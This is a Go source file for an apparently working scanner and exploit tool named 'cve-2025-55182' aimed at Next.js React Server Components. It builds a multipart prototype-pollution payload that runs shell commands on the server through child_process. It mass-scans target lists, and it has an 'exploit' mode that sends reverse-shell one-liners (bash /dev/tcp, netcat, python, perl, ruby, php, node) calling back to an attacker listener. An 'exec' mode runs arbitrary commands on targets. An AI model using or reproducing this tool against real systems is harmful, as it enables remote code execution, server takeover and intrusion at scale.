package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"regexp"
	"runtime"
	"runtime/debug"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	Version  = "2.2.0"
	Boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
)

const (
	Reset  = "\033[0m"
	Red    = "\033[91m"
	Green  = "\033[92m"
	Yellow = "\033[93m"
	Blue   = "\033[94m"
	Gray   = "\033[90m"
)

// Pre-compiled regex - compile once, use many times
var rcePattern = regexp.MustCompile(`rce=11111`)

// Pre-built payloads - build once at startup, reuse for all requests
var (
	rcePayload     string
	rceContentType string
	safePayload    string
	safeContentType string
	payloadOnce    sync.Once
)

func initPayloads() {
	payloadOnce.Do(func() {
		rcePayload, rceContentType = buildRCEPayload()
		safePayload, safeContentType = buildSafePayload()
	})
}

// Result uses smaller types and omits empty fields
type Result struct {
	Host       string `json:"host"`
	Vulnerable bool   `json:"vulnerable,omitempty"`
	StatusCode int16  `json:"status_code,omitempty"` // int16 instead of int
	Error      string `json:"error,omitempty"`
	Evidence   string `json:"evidence,omitempty"`
	Timestamp  int64  `json:"timestamp"` // Unix timestamp instead of string
}

type ScanConfig struct {
	Port        int
	Path        string
	Threads     int
	Timeout     time.Duration
	SafeMode    bool
	Insecure    bool
	UseTLS      bool
	Verbose     bool
	JSONOutput  bool
	Quiet       bool
	MaxMemoryMB int64
	StreamMode  bool // Don't store results in memory
}

type ExploitConfig struct {
	Target       string
	Port         int
	Path         string
	UseTLS       bool
	Insecure     bool
	Timeout      time.Duration
	ListenerIP   string
	ListenerPort int
	Shell        string
}

type Stats struct {
	Total      int64
	Scanned    int64
	Vulnerable int64
	Errors     int64
}

// Reusable buffer pool to avoid allocations
var bufferPool = sync.Pool{
	New: func() interface{} {
		buf := make([]byte, 4096) // 4KB buffer for reading responses
		return &buf
	},
}

// Reusable string builder pool
var stringBuilderPool = sync.Pool{
	New: func() interface{} {
		return &strings.Builder{}
	},
}

func getBuffer() *[]byte {
	return bufferPool.Get().(*[]byte)
}

func putBuffer(buf *[]byte) {
	bufferPool.Put(buf)
}

func getStringBuilder() *strings.Builder {
	sb := stringBuilderPool.Get().(*strings.Builder)
	sb.Reset()
	return sb
}

func putStringBuilder(sb *strings.Builder) {
	stringBuilderPool.Put(sb)
}

// MemoryLimiter with more aggressive controls
type MemoryLimiter struct {
	maxBytes      uint64
	enabled       bool
	paused        int32
	checkInterval time.Duration
}

func NewMemoryLimiter(maxMB int64) *MemoryLimiter {
	ml := &MemoryLimiter{
		checkInterval: 50 * time.Millisecond,
	}
	if maxMB > 0 {
		ml.maxBytes = uint64(maxMB) * 1024 * 1024
		ml.enabled = true
		debug.SetMemoryLimit(int64(ml.maxBytes))
		// More aggressive GC
		debug.SetGCPercent(50) // Default is 100
	}
	return ml
}

func GetMemoryUsage() uint64 {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	return m.Alloc
}

func GetMemoryUsageMB() float64 {
	return float64(GetMemoryUsage()) / 1024 / 1024
}

func (ml *MemoryLimiter) WaitForMemory() {
	if !ml.enabled {
		return
	}

	threshold := uint64(float64(ml.maxBytes) * 0.85)
	for GetMemoryUsage() >= threshold {
		if atomic.CompareAndSwapInt32(&ml.paused, 0, 1) {
			runtime.GC()
			debug.FreeOSMemory() // Return memory to OS
		}
		time.Sleep(ml.checkInterval)
	}
	atomic.StoreInt32(&ml.paused, 0)
}

func (ml *MemoryLimiter) ForceGC() {
	if !ml.enabled {
		return
	}
	if GetMemoryUsage() > uint64(float64(ml.maxBytes)*0.7) {
		runtime.GC()
	}
}

// Lightweight logger - no mutex for non-critical paths
type Logger struct {
	quiet      bool
	jsonOutput bool
	mu         sync.Mutex
	w          io.Writer
}

func NewLogger(quiet, jsonOutput bool) *Logger {
	return &Logger{
		quiet:      quiet,
		jsonOutput: jsonOutput,
		w:          os.Stderr,
	}
}

func (l *Logger) Info(format string, args ...interface{}) {
	if l.quiet || l.jsonOutput {
		return
	}
	l.mu.Lock()
	fmt.Fprintf(l.w, "%s[*]%s %s\n", Blue, Reset, fmt.Sprintf(format, args...))
	l.mu.Unlock()
}

func (l *Logger) Success(format string, args ...interface{}) {
	if l.jsonOutput {
		return
	}
	l.mu.Lock()
	fmt.Fprintf(l.w, "%s[+]%s %s\n", Green, Reset, fmt.Sprintf(format, args...))
	l.mu.Unlock()
}

func (l *Logger) Warning(format string, args ...interface{}) {
	if l.quiet || l.jsonOutput {
		return
	}
	l.mu.Lock()
	fmt.Fprintf(l.w, "%s[!]%s %s\n", Yellow, Reset, fmt.Sprintf(format, args...))
	l.mu.Unlock()
}

func (l *Logger) Error(format string, args ...interface{}) {
	l.mu.Lock()
	fmt.Fprintf(l.w, "%s[-]%s %s\n", Red, Reset, fmt.Sprintf(format, args...))
	l.mu.Unlock()
}

func (l *Logger) Vuln(host, evidence string) {
	if l.jsonOutput {
		return
	}
	l.mu.Lock()
	fmt.Fprintf(os.Stdout, "%s[VULN]%s %s\n", Red, Reset, host)
	if evidence != "" {
		fmt.Fprintf(os.Stdout, "       %s%s%s\n", Gray, evidence, Reset)
	}
	l.mu.Unlock()
}

func (l *Logger) Safe(host string, statusCode int16) {
	if l.quiet || l.jsonOutput {
		return
	}
	l.mu.Lock()
	fmt.Fprintf(l.w, "%s[SAFE]%s %s %s(%d)%s\n", Green, Reset, host, Gray, statusCode, Reset)
	l.mu.Unlock()
}

func (l *Logger) ScanError(host, errMsg string) {
	if l.quiet || l.jsonOutput {
		return
	}
	l.mu.Lock()
	fmt.Fprintf(l.w, "%s[ERR]%s  %s %s(%s)%s\n", Yellow, Reset, host, Gray, errMsg, Reset)
	l.mu.Unlock()
}

func (l *Logger) Progress(scanned, total, vulnerable int64, memMB float64, memLimit int64) {
	if l.quiet || l.jsonOutput {
		return
	}
	l.mu.Lock()
	pct := float64(scanned) / float64(total) * 100
	if memLimit > 0 {
		fmt.Fprintf(l.w, "\r%s[*]%s Progress: %d/%d (%.0f%%) | Vuln: %s%d%s | Mem: %.0f/%dMB  ",
			Blue, Reset, scanned, total, pct, Red, vulnerable, Reset, memMB, memLimit)
	} else {
		fmt.Fprintf(l.w, "\r%s[*]%s Progress: %d/%d (%.0f%%) | Vuln: %s%d%s | Mem: %.0fMB  ",
			Blue, Reset, scanned, total, pct, Red, vulnerable, Reset, memMB)
	}
	l.mu.Unlock()
}

func (l *Logger) ClearLine() {
	if l.quiet || l.jsonOutput {
		return
	}
	fmt.Fprint(l.w, "\r\033[K")
}

// Build payloads using string builder for efficiency
func buildRCEPayload() (string, string) {
	cmd := `echo $((41*271))`
	prefix := `var res=process.mainModule.require('child_process').execSync('` + cmd + `').toString().trim();` +
		"throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/vuln?rce=${res};307;`});"
	return buildPayloadWithPrefix(prefix)
}

func buildSafePayload() (string, string) {
	sb := getStringBuilder()
	defer putStringBuilder(sb)

	sb.WriteString("--")
	sb.WriteString(Boundary)
	sb.WriteString("\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{}\r\n--")
	sb.WriteString(Boundary)
	sb.WriteString("\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n[\"$1:aa:aa\"]\r\n--")
	sb.WriteString(Boundary)
	sb.WriteString("--\r\n")

	return sb.String(), "multipart/form-data; boundary=" + Boundary
}

func buildReverseShellPayload(listenerIP string, listenerPort int, shellType string) (string, string) {
	var cmd string

	switch shellType {
	case "bash":
		cmd = fmt.Sprintf(`bash -i >& /dev/tcp/%s/%d 0>&1`, listenerIP, listenerPort)
	case "sh":
		cmd = fmt.Sprintf(`sh -i >& /dev/tcp/%s/%d 0>&1`, listenerIP, listenerPort)
	case "nc", "netcat":
		cmd = fmt.Sprintf(`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f`, listenerIP, listenerPort)
	case "nc-e":
		cmd = fmt.Sprintf(`nc -e /bin/sh %s %d`, listenerIP, listenerPort)
	case "python":
		cmd = fmt.Sprintf(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, listenerIP, listenerPort)
	case "python3":
		cmd = fmt.Sprintf(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, listenerIP, listenerPort)
	case "perl":
		cmd = fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, listenerIP, listenerPort)
	case "ruby":
		cmd = fmt.Sprintf(`ruby -rsocket -e'f=TCPSocket.open("%s",%d).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'`, listenerIP, listenerPort)
	case "php":
		cmd = fmt.Sprintf(`php -r '$sock=fsockopen("%s",%d);exec("/bin/sh -i <&3 >&3 2>&3");'`, listenerIP, listenerPort)
	default: // node
		cmd = fmt.Sprintf(`node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(%d,"%s",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'`, listenerPort, listenerIP)
	}

	escapedCmd := strings.ReplaceAll(cmd, `'`, `\'`)
	escapedCmd = strings.ReplaceAll(escapedCmd, `"`, `\"`)

	prefix := `process.mainModule.require('child_process').exec('` + escapedCmd + `');` +
		"throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/pwned;307;`});"

	return buildPayloadWithPrefix(prefix)
}

func buildCustomCommandPayload(command string) (string, string) {
	escapedCmd := strings.ReplaceAll(command, `'`, `\'`)
	escapedCmd = strings.ReplaceAll(escapedCmd, `"`, `\"`)

	prefix := `process.mainModule.require('child_process').execSync('` + escapedCmd + `');` +
		"throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/cmd;307;`});"

	return buildPayloadWithPrefix(prefix)
}

func buildPayloadWithPrefix(prefix string) (string, string) {
	// Build JSON manually to avoid reflection overhead from json.Marshal
	sb := getStringBuilder()
	defer putStringBuilder(sb)

	// Escape the prefix for JSON
	escapedPrefix := strings.ReplaceAll(prefix, `\`, `\\`)
	escapedPrefix = strings.ReplaceAll(escapedPrefix, `"`, `\"`)
	escapedPrefix = strings.ReplaceAll(escapedPrefix, "\n", `\n`)
	escapedPrefix = strings.ReplaceAll(escapedPrefix, "\r", `\r`)
	escapedPrefix = strings.ReplaceAll(escapedPrefix, "\t", `\t`)

	chunk := `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"` +
		escapedPrefix + `","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`

	sb.WriteString("--")
	sb.WriteString(Boundary)
	sb.WriteString("\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n")
	sb.WriteString(chunk)
	sb.WriteString("\r\n--")
	sb.WriteString(Boundary)
	sb.WriteString("\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n--")
	sb.WriteString(Boundary)
	sb.WriteString("\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n--")
	sb.WriteString(Boundary)
	sb.WriteString("--\r\n")

	return sb.String(), "multipart/form-data; boundary=" + Boundary
}

// Optimized URL building without extra allocations
func buildURL(host string, port int, useTLS bool, path string) string {
	host = strings.TrimSpace(host)

	// Remove protocol prefixes
	if strings.HasPrefix(host, "https://") {
		host = host[8:]
	} else if strings.HasPrefix(host, "http://") {
		host = host[7:]
	}

	// Remove trailing slash
	host = strings.TrimSuffix(host, "/")

	// Remove existing port
	if idx := strings.LastIndex(host, ":"); idx != -1 {
		if !strings.Contains(host[idx:], "]") {
			host = host[:idx]
		}
	}

	sb := getStringBuilder()
	defer putStringBuilder(sb)

	if useTLS {
		sb.WriteString("https://")
	} else {
		sb.WriteString("http://")
	}
	sb.WriteString(host)

	if !((useTLS && port == 443) || (!useTLS && port == 80)) {
		sb.WriteByte(':')
		sb.WriteString(fmt.Sprintf("%d", port))
	}

	if path != "" {
		if path[0] != '/' {
			sb.WriteByte('/')
		}
		sb.WriteString(path)
	}

	return sb.String()
}

// Shared HTTP client with connection pooling
var httpClientPool = sync.Pool{
	New: func() interface{} {
		return &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
				DisableKeepAlives:     false, // Enable keep-alives for connection reuse
				MaxIdleConns:          100,
				MaxIdleConnsPerHost:   10,
				MaxConnsPerHost:       20,
				IdleConnTimeout:       30 * time.Second,
				ResponseHeaderTimeout: 10 * time.Second,
				DisableCompression:    true, // Disable to reduce memory
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
	},
}

func getHTTPClient(timeout time.Duration, insecure bool) *http.Client {
	client := httpClientPool.Get().(*http.Client)
	client.Timeout = timeout
	if transport, ok := client.Transport.(*http.Transport); ok {
		transport.TLSClientConfig.InsecureSkipVerify = insecure
	}
	return client
}

func putHTTPClient(client *http.Client) {
	httpClientPool.Put(client)
}

func sendRequest(client *http.Client, url, payload, contentType string) (*http.Response, error) {
	req, err := http.NewRequest("POST", url, strings.NewReader(payload))
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", contentType)
	req.Header.Set("Next-Action", "c3a144622dd5b5046f1ccb6007fea3f3710057de")
	req.Header.Set("Accept", "text/x-component")
	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("Connection", "keep-alive")

	return client.Do(req)
}

// Scan with streaming response reading to minimize memory
func scan(host string, config *ScanConfig, client *http.Client) Result {
	url := buildURL(host, config.Port, config.UseTLS, config.Path)
	result := Result{
		Host:      url,
		Timestamp: time.Now().Unix(),
	}

	var payload, contentType string
	if config.SafeMode {
		payload, contentType = safePayload, safeContentType
	} else {
		payload, contentType = rcePayload, rceContentType
	}

	resp, err := sendRequest(client, url, payload, contentType)
	if err != nil {
		result.Error = truncateError(err.Error())
		return result
	}
	defer resp.Body.Close()

	result.StatusCode = int16(resp.StatusCode)

	// Check headers first (no body read needed)
	if !config.SafeMode {
		if h := resp.Header.Get("X-Action-Redirect"); h != "" && rcePattern.MatchString(h) {
			result.Vulnerable = true
			result.Evidence = "RCE via X-Action-Redirect"
			io.Copy(io.Discard, resp.Body) // Drain body
			return result
		}
		if h := resp.Header.Get("Location"); h != "" && rcePattern.MatchString(h) {
			result.Vulnerable = true
			result.Evidence = "RCE via Location"
			io.Copy(io.Discard, resp.Body)
			return result
		}
	}

	// Read body with limited buffer - stream instead of loading all
	vuln, evidence := checkResponseBody(resp, config.SafeMode)
	if vuln {
		result.Vulnerable = true
		result.Evidence = evidence
	}

	return result
}

// Stream-based body checking to avoid loading entire response
func checkResponseBody(resp *http.Response, safeMode bool) (bool, string) {
	buf := getBuffer()
	defer putBuffer(buf)

	// Read up to 8KB in chunks
	var totalRead int
	maxRead := 8192

	for totalRead < maxRead {
		n, err := resp.Body.Read(*buf)
		if n > 0 {
			chunk := string((*buf)[:n])

			if !safeMode {
				if strings.Contains(chunk, "11111") && strings.Contains(chunk, "NEXT_REDIRECT") {
					io.Copy(io.Discard, resp.Body)
					return true, "RCE via body"
				}
			} else {
				if resp.StatusCode == 500 {
					if strings.Contains(chunk, `E{"digest"`) || strings.Contains(chunk, "NEXT_REDIRECT") {
						io.Copy(io.Discard, resp.Body)
						return true, "Potentially vulnerable (RSC error)"
					}
				}
				if strings.Contains(chunk, `$@`) && strings.Contains(chunk, `digest`) {
					io.Copy(io.Discard, resp.Body)
					return true, "Potentially vulnerable (RSC endpoint)"
				}
			}
			totalRead += n
		}
		if err != nil {
			break
		}
	}

	// Drain remaining body
	io.Copy(io.Discard, resp.Body)
	return false, ""
}

// Check safe mode headers
func checkSafeModeHeaders(resp *http.Response) bool {
	server := strings.ToLower(resp.Header.Get("Server"))
	return server == "vercel" || server == "netlify" || resp.Header.Get("Netlify-Vary") != ""
}

// Truncate error messages to save memory
func truncateError(err string) string {
	if len(err) > 64 {
		return err[:64]
	}
	return err
}

func exploit(config *ExploitConfig, log *Logger) error {
	url := buildURL(config.Target, config.Port, config.UseTLS, config.Path)

	log.Info("Target:   %s", url)
	log.Info("Listener: %s:%d", config.ListenerIP, config.ListenerPort)
	log.Info("Shell:    %s", config.Shell)

	payload, contentType := buildReverseShellPayload(config.ListenerIP, config.ListenerPort, config.Shell)
	client := getHTTPClient(config.Timeout, config.Insecure)
	defer putHTTPClient(client)

	log.Info("Sending payload...")

	resp, err := sendRequest(client, url, payload, contentType)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	log.Info("Response: %d", resp.StatusCode)

	switch {
	case resp.StatusCode == 307 || resp.StatusCode == 302 || resp.StatusCode == 303:
		log.Success("Redirect received, payload likely executed")
		log.Success("Check your listener for incoming connection")
	case resp.StatusCode == 500:
		log.Warning("Got 500, command may have executed")
	default:
		log.Warning("Unexpected response, exploit may have failed")
	}

	return nil
}

func execCmd(target string, port int, useTLS bool, path, command string, insecure bool, timeout time.Duration, log *Logger) error {
	url := buildURL(target, port, useTLS, path)

	log.Info("Target:  %s", url)
	log.Info("Command: %s", command)

	payload, contentType := buildCustomCommandPayload(command)
	client := getHTTPClient(timeout, insecure)
	defer putHTTPClient(client)

	log.Info("Sending command...")

	resp, err := sendRequest(client, url, payload, contentType)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	log.Info("Response: %d", resp.StatusCode)

	switch {
	case resp.StatusCode == 307 || resp.StatusCode == 302 || resp.StatusCode == 303:
		log.Success("Command executed (redirect received)")
	case resp.StatusCode == 500:
		log.Warning("Got 500, command likely executed")
	default:
		log.Warning("Unexpected response")
	}

	return nil
}

// Worker pool pattern for better memory control
type WorkerPool struct {
	workers    int
	tasks      chan string
	results    chan Result
	wg         sync.WaitGroup
	config     *ScanConfig
	memLimiter *MemoryLimiter
	client     *http.Client
}

func NewWorkerPool(workers int, config *ScanConfig, memLimiter *MemoryLimiter) *WorkerPool {
	return &WorkerPool{
		workers:    workers,
		tasks:      make(chan string, workers*2), // Buffered channel
		results:    make(chan Result, workers*2),
		config:     config,
		memLimiter: memLimiter,
		client:     getHTTPClient(config.Timeout, config.Insecure),
	}
}

func (wp *WorkerPool) Start() {
	for i := 0; i < wp.workers; i++ {
		wp.wg.Add(1)
		go wp.worker()
	}
}

func (wp *WorkerPool) worker() {
	defer wp.wg.Done()

	for host := range wp.tasks {
		wp.memLimiter.WaitForMemory()
		result := scan(host, wp.config, wp.client)
		wp.results <- result
	}
}

func (wp *WorkerPool) Submit(host string) {
	wp.tasks <- host
}

func (wp *WorkerPool) Close() {
	close(wp.tasks)
	wp.wg.Wait()
	close(wp.results)
	putHTTPClient(wp.client)
}

func (wp *WorkerPool) Results() <-chan Result {
	return wp.results
}

func runScan(targets []string, config *ScanConfig, output string, log *Logger) {
	initPayloads() // Initialize payloads once

	stats := &Stats{Total: int64(len(targets))}
	memLimiter := NewMemoryLimiter(config.MaxMemoryMB)

	// For stream mode, write results directly to file
	var outFile *os.File
	var outWriter *bufio.Writer
	if output != "" && config.StreamMode {
		var err error
		outFile, err = os.Create(output)
		if err != nil {
			log.Error("Failed to create output file: %v", err)
			os.Exit(1)
		}
		defer outFile.Close()
		outWriter = bufio.NewWriter(outFile)
		defer outWriter.Flush()
	}

	// Non-stream mode storage
	var results []Result
	var vulnerableHosts []string
	var resultsMu sync.Mutex

	startTime := time.Now()

	if config.MaxMemoryMB > 0 {
		log.Info("Targets: %d | Threads: %d | Max mem: %dMB | Stream: %v",
			len(targets), config.Threads, config.MaxMemoryMB, config.StreamMode)
	} else {
		log.Info("Targets: %d | Threads: %d | Stream: %v", len(targets), config.Threads, config.StreamMode)
	}

	// Use worker pool
	pool := NewWorkerPool(config.Threads, config, memLimiter)
	pool.Start()

	// Feed targets to workers
	go func() {
		for _, t := range targets {
			pool.Submit(t)
		}
		pool.Close()
	}()

	// Process results
	for result := range pool.Results() {
		scanned := atomic.AddInt64(&stats.Scanned, 1)

		if result.Vulnerable {
			atomic.AddInt64(&stats.Vulnerable, 1)
			log.ClearLine()
			log.Vuln(result.Host, result.Evidence)

			if config.StreamMode && outWriter != nil {
				outWriter.WriteString(result.Host + "\n")
			} else {
				resultsMu.Lock()
				vulnerableHosts = append(vulnerableHosts, result.Host)
				resultsMu.Unlock()
			}
		} else if result.Error != "" {
			atomic.AddInt64(&stats.Errors, 1)
			if config.Verbose {
				log.ClearLine()
				log.ScanError(result.Host, result.Error)
			}
		} else if config.Verbose {
			log.ClearLine()
			log.Safe(result.Host, result.StatusCode)
		}

		// Store results only if JSON output and not streaming
		if config.JSONOutput && !config.StreamMode {
			resultsMu.Lock()
			results = append(results, result)
			resultsMu.Unlock()
		}

		// Update progress every 10 scans to reduce overhead
		if scanned%10 == 0 || scanned == stats.Total {
			log.Progress(scanned, stats.Total, atomic.LoadInt64(&stats.Vulnerable),
				GetMemoryUsageMB(), config.MaxMemoryMB)
		}
	}

	duration := time.Since(startTime)
	log.ClearLine()

	if config.JSONOutput && !config.StreamMode {
		enc := json.NewEncoder(os.Stdout)
		enc.SetIndent("", "  ")
		enc.Encode(results)
	} else {
		fmt.Fprintf(os.Stderr, "\n%s[*]%s Completed in %s\n", Blue, Reset, duration.Round(time.Millisecond))
		fmt.Fprintf(os.Stderr, "    Scanned:    %d\n", stats.Scanned)
		fmt.Fprintf(os.Stderr, "    Vulnerable: %s%d%s\n", Red, stats.Vulnerable, Reset)
		fmt.Fprintf(os.Stderr, "    Errors:     %d\n", stats.Errors)
		fmt.Fprintf(os.Stderr, "    Peak mem:   %.0fMB\n", GetMemoryUsageMB())
	}

	// Write non-stream output
	if output != "" && !config.StreamMode && len(vulnerableHosts) > 0 {
		sb := getStringBuilder()
		for _, h := range vulnerableHosts {
			sb.WriteString(h)
			sb.WriteByte('\n')
		}
		if err := os.WriteFile(output, []byte(sb.String()), 0644); err != nil {
			log.Error("Failed to write output: %v", err)
		} else {
			log.Success("Saved %d vulnerable hosts to %s", len(vulnerableHosts), output)
		}
		putStringBuilder(sb)
	}

	if stats.Vulnerable > 0 {
		os.Exit(1)
	}
}

// Stream targets from file instead of loading all into memory
func streamTargets(filename string, ch chan<- string) error {
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 1024), 1024) // Small buffer

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && line[0] != '#' {
			ch <- line
		}
	}

	return scanner.Err()
}

func loadTargets(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var targets []string
	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 1024), 1024)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && line[0] != '#' {
			targets = append(targets, line)
		}
	}

	return targets, scanner.Err()
}

func countLines(filename string) (int, error) {
	file, err := os.Open(filename)
	if err != nil {
		return 0, err
	}
	defer file.Close()

	count := 0
	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 1024), 1024)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && line[0] != '#' {
			count++
		}
	}

	return count, scanner.Err()
}

func main() {
	// Set low memory defaults
	debug.SetGCPercent(100)

	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}

	switch os.Args[1] {
	case "scan":
		cmdScan()
	case "exploit":
		cmdExploit()
	case "exec":
		cmdExec()
	case "version", "-v", "--version":
		fmt.Printf("cve-2025-55182 v%s\n", Version)
	case "help", "-h", "--help":
		printUsage()
	default:
		fmt.Fprintf(os.Stderr, "Unknown command: %s\n", os.Args[1])
		printUsage()
		os.Exit(1)
	}
}

func cmdScan() {
	fs := flag.NewFlagSet("scan", flag.ExitOnError)
	target := fs.String("u", "", "Single target URL or IP")
	listFile := fs.String("l", "", "File with targets (one per line)")
	port := fs.Int("p", 443, "Target port")
	path := fs.String("path", "/", "Request path")
	noTLS := fs.Bool("no-tls", false, "Use HTTP instead of HTTPS")
	insecure := fs.Bool("k", true, "Skip TLS verification")
	timeout := fs.Int("timeout", 10, "Timeout in seconds")
	threads := fs.Int("t", 10, "Concurrent threads")
	safeMode := fs.Bool("safe", false, "Safe detection (no code execution)")
	output := fs.String("o", "", "Output file for vulnerable hosts")
	jsonOut := fs.Bool("json", false, "JSON output")
	verbose := fs.Bool("v", false, "Verbose output")
	quiet := fs.Bool("q", false, "Quiet mode")
	maxMemory := fs.Int64("max-mem", 0, "Maximum memory in MB (0 = unlimited)")
	streamMode := fs.Bool("stream", false, "Stream mode - write results immediately, lower memory")
	fs.Parse(os.Args[2:])

	log := NewLogger(*quiet, *jsonOut)

	if *target == "" && *listFile == "" {
		log.Error("Specify target with -u or list with -l")
		fs.PrintDefaults()
		os.Exit(1)
	}

	var targets []string
	if *target != "" {
		targets = append(targets, *target)
	} else {
		var err error
		targets, err = loadTargets(*listFile)
		if err != nil {
			log.Error("Failed to load targets: %v", err)
			os.Exit(1)
		}
	}

	if len(targets) == 0 {
		log.Error("No valid targets")
		os.Exit(1)
	}

	config := &ScanConfig{
		Port:        *port,
		Path:        *path,
		Threads:     *threads,
		Timeout:     time.Duration(*timeout) * time.Second,
		SafeMode:    *safeMode,
		Insecure:    *insecure,
		UseTLS:      !*noTLS,
		Verbose:     *verbose,
		JSONOutput:  *jsonOut,
		Quiet:       *quiet,
		MaxMemoryMB: *maxMemory,
		StreamMode:  *streamMode,
	}

	runScan(targets, config, *output, log)
}

func cmdExploit() {
	fs := flag.NewFlagSet("exploit", flag.ExitOnError)
	target := fs.String("u", "", "Target URL or IP")
	port := fs.Int("p", 443, "Target port")
	path := fs.String("path", "/", "Request path")
	noTLS := fs.Bool("no-tls", false, "Use HTTP")
	insecure := fs.Bool("k", true, "Skip TLS verification")
	timeout := fs.Int("timeout", 30, "Timeout in seconds")
	lhost := fs.String("lhost", "", "Listener IP")
	lport := fs.Int("lport", 4444, "Listener port")
	shell := fs.String("shell", "node", "Shell: node,bash,sh,nc,nc-e,python,python3,perl,ruby,php")
	fs.Parse(os.Args[2:])

	log := NewLogger(false, false)

	if *target == "" {
		log.Error("Target required (-u)")
		os.Exit(1)
	}
	if *lhost == "" {
		log.Error("Listener IP required (-lhost)")
		os.Exit(1)
	}

	log.Warning("Start listener first: nc -lvnp %d", *lport)

	config := &ExploitConfig{
		Target:       *target,
		Port:         *port,
		Path:         *path,
		UseTLS:       !*noTLS,
		Insecure:     *insecure,
		Timeout:      time.Duration(*timeout) * time.Second,
		ListenerIP:   *lhost,
		ListenerPort: *lport,
		Shell:        *shell,
	}

	if err := exploit(config, log); err != nil {
		log.Error("Exploit failed: %v", err)
		os.Exit(1)
	}
}

func cmdExec() {
	fs := flag.NewFlagSet("exec", flag.ExitOnError)
	target := fs.String("u", "", "Target URL or IP")
	port := fs.Int("p", 443, "Target port")
	path := fs.String("path", "/", "Request path")
	noTLS := fs.Bool("no-tls", false, "Use HTTP")
	insecure := fs.Bool("k", true, "Skip TLS verification")
	timeout := fs.Int("timeout", 30, "Timeout in seconds")
	command := fs.String("c", "", "Command to execute")
	fs.Parse(os.Args[2:])

	log := NewLogger(false, false)

	if *target == "" {
		log.Error("Target required (-u)")
		os.Exit(1)
	}
	if *command == "" {
		log.Error("Command required (-c)")
		os.Exit(1)
	}

	if err := execCmd(*target, *port, !*noTLS, *path, *command, *insecure, time.Duration(*timeout)*time.Second, log); err != nil {
		log.Error("Execution failed: %v", err)
		os.Exit(1)
	}
}

func printUsage() {
	fmt.Fprintf(os.Stderr, `cve-2025-55182 v%s - Next.js RSC RCE Scanner (Memory Optimized)

Usage:
  %s <command> [options]

Commands:
  scan      Scan targets for vulnerability
  exploit   Send reverse shell payload
  exec      Execute arbitrary command
  version   Show version
  help      Show this help

Examples:
  %s scan -u example.com
  %s scan -l targets.txt -t 50 -o vuln.txt
  %s scan -l targets.txt -t 100 -max-mem 256 -stream
  %s scan -u 192.168.1.100 -p 3000 -no-tls -safe
  %s exploit -u example.com -lhost 10.0.0.5 -lport 4444
  %s exec -u example.com -c 'id'

Memory Options:
  -max-mem 256    Limit memory to 256MB
  -max-mem 512    Limit memory to 512MB  
  -stream         Stream mode - minimal memory, writes results immediately

Run '%s <command> -h' for command-specific options.
`, Version, os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0])
}
